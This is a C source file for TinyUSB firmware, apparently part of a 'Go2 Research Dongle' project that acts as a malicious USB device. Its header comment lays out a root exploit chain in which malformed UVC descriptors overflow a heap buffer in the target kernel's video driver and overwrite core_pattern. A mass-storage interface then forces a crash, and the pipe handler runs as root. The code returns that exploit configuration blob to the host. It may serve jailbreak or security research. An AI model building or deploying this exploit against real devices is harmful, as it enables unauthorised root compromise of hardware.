/*
 * USB descriptors: UVC exploit + Mass Storage composite.
 *
 * The configuration descriptor is a 1469-byte blob extracted from Will's
 * pico-arm.uf2. It declares 30 interfaces:
 *
 *   #0:      Video Control (VC_HEADER + VC_INPUT_TERMINAL + ...)
 *   #1:      Video Streaming (VS_FORMAT/FRAME + exploit payload)
 *   #2-#24:  Vendor class placeholders (0xFF, no endpoints)
 *   #25-#28: Additional VC/VS with C0DE patterns, kernel addresses,
 *            core_pattern strings, De Bruijn sequences
 *   #29:     Mass Storage Class (Bulk OUT 0x02 + Bulk IN 0x82)
 *
 * When the Go2 kernel enumerates this device, the malformed UVC
 * descriptors trigger a heap overflow in the USB Video Class driver,
 * overwriting core_pattern and core_name_size in kernel .data.
 * The MSC interface then triggers blkid → SIGSEGV → core dump →
 * the overwritten core_pattern pipe handler executes as root.
 */

#include "tusb.h"
#include "exploit_config.h"

/* ---------- Device descriptor ---------- */

tusb_desc_device_t const desc_device = {
    .bLength            = sizeof(tusb_desc_device_t),
    .bDescriptorType    = TUSB_DESC_DEVICE,
    .bcdUSB             = 0x0200,
    .bDeviceClass       = 0,
    .bDeviceSubClass    = 0,
    .bDeviceProtocol    = 0,
    .bMaxPacketSize0    = CFG_TUD_ENDPOINT0_SIZE,
    .idVendor           = 0x1209,
    .idProduct          = 0x0006,
    .bcdDevice          = 0x0100,
    .iManufacturer      = 1,
    .iProduct           = 2,
    .iSerialNumber      = 3,
    .bNumConfigurations = 1,
};

uint8_t const *tud_descriptor_device_cb(void) {
    return (uint8_t const *)&desc_device;
}

/* ---------- Configuration descriptor ---------- */

uint8_t const *tud_descriptor_configuration_cb(uint8_t index) {
    (void)index;
    return exploit_config_desc;
}

/* ---------- String descriptors ---------- */

static char const *string_desc_arr[] = {
    [0] = (const char[]){0x09, 0x04},
    [1] = "UnLeash",
    [2] = "Go2 Research Dongle",
    [3] = "UL2-001",
    [4] = "UnLeash MSC",
};

static uint16_t _desc_str[32 + 1];

uint16_t const *tud_descriptor_string_cb(uint8_t index, uint16_t langid) {
    (void)langid;
    size_t chr_count;

    switch (index) {
    case 0:
        memcpy(&_desc_str[1], string_desc_arr[0], 2);
        chr_count = 1;
        break;
    default:
        if (index >= sizeof(string_desc_arr) / sizeof(string_desc_arr[0]))
            return NULL;
        const char *str = string_desc_arr[index];
        chr_count = strlen(str);
        if (chr_count > 31) chr_count = 31;
        for (size_t i = 0; i < chr_count; i++)
            _desc_str[1 + i] = str[i];
        break;
    }

    _desc_str[0] = (uint16_t)((TUSB_DESC_STRING << 8) | (2 * chr_count + 2));
    return _desc_str;
}
